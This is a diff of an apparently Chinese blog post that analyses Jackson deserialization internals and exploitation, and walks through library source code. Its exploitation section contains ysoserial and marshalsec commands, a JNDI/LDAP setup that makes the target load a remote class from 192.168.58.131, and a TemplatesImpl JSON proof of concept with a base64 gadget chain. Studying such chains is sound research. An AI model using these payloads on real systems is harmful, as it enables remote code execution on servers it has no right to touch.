+                    cprop<span class="token punctuation">.</span><span class="token function">setFallbackSetter</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                prop <span class="token operator">=</span> cprop<span class="token punctuation">;</span>
+                builder<span class="token punctuation">.</span><span class="token function">addCreatorProperty</span><span class="token punctuation">(</span>cprop<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>prop <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> views <span class="token operator">=</span> propDef<span class="token punctuation">.</span><span class="token function">findViews</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>views <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment" spellcheck="true">// one more twist: if default inclusion disabled, need to force empty set of views</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ctxt<span class="token punctuation">.</span><span class="token function">isEnabled</span><span class="token punctuation">(</span>MapperFeature<span class="token punctuation">.</span>DEFAULT_VIEW_INCLUSION<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        views <span class="token operator">=</span> NO_VIEWS<span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+                <span class="token comment" spellcheck="true">// one more thing before adding to builder: copy any metadata</span>
+                prop<span class="token punctuation">.</span><span class="token function">setViews</span><span class="token punctuation">(</span>views<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                builder<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>getter方法调用的条件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228004956575.png" alt="image-20201228004956575"></p>
+<p>最终用来解析还原对象的Deserializer.deserialize 依据_hashArea的name 与 Method对应还原对象。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228010447887.png" alt="image-20201228010447887"></p>
+<p>5.<code>deser.deserialize</code></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">deserialize</span><span class="token punctuation">(</span>JsonParser p<span class="token punctuation">,</span> DeserializationContext ctxt<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException
+<span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">// common case first</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">isExpectedStartObjectToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_vanillaProcessing<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token function">vanillaDeserialize</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> ctxt<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始化一个对象</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// 23-Sep-2015, tatu: This is wrong at some many levels, but for now... it is</span>
+        <span class="token comment" spellcheck="true">//    what it is, including "expected behavior".</span>
+        p<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_objectIdReader <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token function">deserializeWithObjectId</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> ctxt<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token function">deserializeFromObject</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> ctxt<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token function">_deserializeOther</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> ctxt<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">getCurrentToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="6-vanillaDeserialize"><a href="#6-vanillaDeserialize" class="headerlink" title="6.vanillaDeserialize"></a>6.<code>vanillaDeserialize</code></h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> Object <span class="token function">vanillaDeserialize</span><span class="token punctuation">(</span>JsonParser p<span class="token punctuation">,</span>
+                                        DeserializationContext ctxt<span class="token punctuation">,</span> JsonToken t<span class="token punctuation">)</span>
+    <span class="token keyword">throws</span> IOException
+<span class="token punctuation">{</span>
+    <span class="token keyword">final</span> Object bean <span class="token operator">=</span> _valueInstantiator<span class="token punctuation">.</span><span class="token function">createUsingDefault</span><span class="token punctuation">(</span>ctxt<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//默认构造器初始化对象</span>
+    <span class="token comment" spellcheck="true">// [databind#631]: Assign current value, to be accessible by custom serializers</span>
+    p<span class="token punctuation">.</span><span class="token function">setCurrentValue</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">hasTokenId</span><span class="token punctuation">(</span>JsonTokenId<span class="token punctuation">.</span>ID_FIELD_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        String propName <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getCurrentName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">do</span> <span class="token punctuation">{</span>
+            p<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            SettableBeanProperty prop <span class="token operator">=</span> _beanProperties<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取字段的设置方法</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>prop <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// normal case</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    prop<span class="token punctuation">.</span><span class="token function">deserializeAndSet</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> ctxt<span class="token punctuation">,</span> bean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用初始化字段，调用每个properties对应的方法</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token function">wrapAndThrow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> bean<span class="token punctuation">,</span> propName<span class="token punctuation">,</span> ctxt<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token function">handleUnknownVanilla</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> ctxt<span class="token punctuation">,</span> bean<span class="token punctuation">,</span> propName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>propName <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">nextFieldName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> bean<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>字段的赋值在  <code>SettableBeanProperty.deserializeAndSet()</code>: 不同的 SettableBeanProperty 有不同的行为</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228011352644.png" alt="image-20201228011352644"></p>
+<p>如</p>
+<p>1.MethodProperty通过反射调用bean的setter方法</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deserializeAndSet</span><span class="token punctuation">(</span>JsonParser p<span class="token punctuation">,</span> DeserializationContext ctxt<span class="token punctuation">,</span>
+                              Object instance<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException
+<span class="token punctuation">{</span>
+    Object value <span class="token operator">=</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> ctxt<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        _setter<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>instance<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">_throwAsIOE</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2.FieldProperty通过反射设置Bean的值</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deserializeAndSet</span><span class="token punctuation">(</span>JsonParser p<span class="token punctuation">,</span>
+                              DeserializationContext ctxt<span class="token punctuation">,</span> Object instance<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException
+<span class="token punctuation">{</span>
+    Object value <span class="token operator">=</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> ctxt<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        _field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>instance<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">_throwAsIOE</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>这里的deserialize 会判断是否开启了 Default Typing ，如果开启了该属性则使⽤ deserializeWithType ⽅法获取值，反之使⽤ deserialize ⽅法获取值 。</strong> </p>
+<h2 id="三、Jackson反序列化利用"><a href="#三、Jackson反序列化利用" class="headerlink" title="三、Jackson反序列化利用"></a>三、Jackson反序列化利用</h2><h3 id="3-1-ysoserial快速生成"><a href="#3-1-ysoserial快速生成" class="headerlink" title="3.1 ysoserial快速生成"></a>3.1 ysoserial快速生成</h3><p>1.生成利用链代码（Exploit Class 字节码，通过Class.loadClass）</p>
+<pre class="line-numbers language-shell"><code class="language-shell">java -jar ysoserial.jar CommonsCollections1 notepad.exe |base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201226234047772.png" alt="image-20201226234047772"></p>
-<h2 id="3-2-com-sun-rowset-JdbcRowSetImpl"><a href="#3-2-com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="3.2 com.sun.rowset.JdbcRowSetImpl"></a>3.2 com.sun.rowset.JdbcRowSetImpl</h2><p>还是举Fastjson同样的利用链 com.sun.rowset.JdbcRowSetImple,具体调用过程可以参考Fastjson的调用过程。</p>
+<p>2.marshalsec 快速搭建LDAP|RMI服务</p>
+<pre class="line-numbers language-shell"><code class="language-shell">java -cp target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.58.131:8080/#ExecTest 1099<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="3-2-JNDI注入利用"><a href="#3-2-JNDI注入利用" class="headerlink" title="3.2 JNDI注入利用"></a>3.2 JNDI注入利用</h3><p>举Fastjson同样的利用链 com.sun.rowset.JdbcRowSetImpl说明存在Jackson反序列化漏洞的JNDI注入利用，涉及的有</p>
+<blockquote>
+<ol>
+<li>RMI Reference JNDI注入利用</li>
+<li>LDAP JNDI注入利用</li>
+<li>CORBA JNDI注入利用</li>
+</ol>
+</blockquote>
+<p>关于他们的纤细解析可以看《JavaSec JNDI注入利用分析》</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>thonsun<span class="token punctuation">.</span>demo03<span class="token punctuation">;</span>
 
 <span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span>
@@ -1051,6 +1327,100 @@
 <pre class="line-numbers language-shell"><code class="language-shell">javac ExecTest.java & python -m http.server 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>执行效果</p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201227000019719.png" alt="image-20201227000019719"></p>
+<h3 id="3-3-Java反序列化"><a href="#3-3-Java反序列化" class="headerlink" title="3.3 Java反序列化"></a>3.3 Java反序列化</h3><p>这里举<code>com.sun.org.apache.xalan.internal.xsltc.TemplateImpl</code> 说明在json反序列化中利用Java反序列化漏洞进行RCE的利用调用getter方法的情况</p>
+<p>poc</p>
+<pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">[</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>
+    <span class="token property">"transletBytecodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxl
+clXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxq
+YXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxl
+Y3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhh
+bmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5
+TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9u
+cy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3Rv
+cnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcv
+YXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hl
+LmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3Jn
+LmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJY
+dpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFu
+Zy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMu
+ZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9s
+YW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5
+cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8Qcyls
+AgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhw
+AAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAA
+eHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIA
+EGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5n
+LlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAC25vdGVwYWQuZXhldAAEZXhlY3VxAH4AHgAAAAFx
+AH4AI3NxAH4AEXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2
+YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMW
+YNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHZyABJq
+YXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo="</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+     <span class="token property">"transletName"</span><span class="token operator">:</span><span class="token string">"a.b"</span><span class="token punctuation">,</span>
+     <span class="token property">"outputProperties"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>一个利用链是：</p>
+<blockquote>
+<p>getOutputProperties()-&gt;newTransFormer()→getTransletInstance()-&gt;newInstance()</p>
+</blockquote>
+<p>利⽤的属性为 transletBytecodes 、 transletName 、 outputProperties ，所以最后⽤到的⾃然是这⼏个属性的 get 或<br>者 set ⽅法。这⾥主要会调⽤到 getOutputProperties ⽅法，为什么是 get ⽽不是 set ，这是因为该属性没有 set ⽅法，同时也不满⾜ hasField 的条件，getOuputProperties返回值也是Map的子类，所以最后会调⽤的实际是 get ⽅法 。</p>
+<p><code>getOutputProperty</code></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> Properties <span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">TransformerConfigurationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>newTranformer</code></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> Transformer <span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">throws</span> TransformerConfigurationException
+<span class="token punctuation">{</span>
+    TransformerImpl transformer<span class="token punctuation">;</span>
+
+    transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformerImpl</span><span class="token punctuation">(</span><span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _outputProperties<span class="token punctuation">,</span>
+                                      _indentNumber<span class="token punctuation">,</span> _tfactory<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>_uriResolver <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        transformer<span class="token punctuation">.</span><span class="token function">setURIResolver</span><span class="token punctuation">(</span>_uriResolver<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>_tfactory<span class="token punctuation">.</span><span class="token function">getFeature</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>FEATURE_SECURE_PROCESSING<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        transformer<span class="token punctuation">.</span><span class="token function">setSecureProcessing</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> transformer<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>getTransletInstance()</code></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> Translet <span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_name <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_class <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// The translet needs to keep a reference to all its auxiliary</span>
+        <span class="token comment" spellcheck="true">// class to prevent the GC from collecting them</span>
+        AbstractTranslet translet <span class="token operator">=</span> <span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span> _class<span class="token punctuation">[</span>_transletIndex<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
+        translet<span class="token punctuation">.</span><span class="token function">postInitialization</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        translet<span class="token punctuation">.</span><span class="token function">setTemplates</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        translet<span class="token punctuation">.</span><span class="token function">setServicesMechnism</span><span class="token punctuation">(</span>_useServicesMechanism<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        translet<span class="token punctuation">.</span><span class="token function">setAllowedProtocols</span><span class="token punctuation">(</span>_accessExternalStylesheet<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_auxClasses <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            translet<span class="token punctuation">.</span><span class="token function">setAuxiliaryClasses</span><span class="token punctuation">(</span>_auxClasses<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> translet<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        ErrorMsg err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ErrorMsg</span><span class="token punctuation">(</span>ErrorMsg<span class="token punctuation">.</span>TRANSLET_OBJECT_ERR<span class="token punctuation">,</span> _name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        ErrorMsg err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ErrorMsg</span><span class="token punctuation">(</span>ErrorMsg<span class="token punctuation">.</span>TRANSLET_OBJECT_ERR<span class="token punctuation">,</span> _name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
